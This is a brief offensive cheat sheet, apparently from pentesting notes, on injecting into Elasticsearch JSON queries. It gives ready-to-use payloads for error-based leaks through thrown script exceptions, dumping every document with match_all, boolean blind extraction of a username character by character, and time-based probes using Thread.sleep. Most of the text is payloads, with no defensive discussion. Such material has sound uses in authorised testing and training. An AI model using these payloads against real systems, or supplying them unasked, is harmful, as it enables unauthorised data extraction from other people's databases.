# Elasticsearch

Elasticsearch uses JSON queries, so injection involves manipulating query objects to extract or filter data.

## Error-based
Inject invalid scripts to error with data.

If scripting: {"script_score": {"script": "throw new Exception('version: ' + params._source.version)"}} to leak in error.

## Union-like
Use match_all to retrieve all documents.

{"query": {"match_all": {}}} to get all data as proof.

## Boolean-based blind
Use script queries for conditions.

For username field == 'admin':
{"query": {"script": {"script": "doc['username'].value == 'admin'"}}}

For length >16:
{"query": {"script": {"script": "doc['username'].value.length() >16"}}}

Binary search as above.

For chars: doc['username'].value.charAt(0) == 'a' or > codes.

## Time-based blind
If scripting: Thread.sleep(5000) if condition.

{"query": {"script_score": {"script": "if (doc['username'].value.charAt(0)=='a') Thread.sleep(5000)"}}}

Adapt for binary search on length and chars.

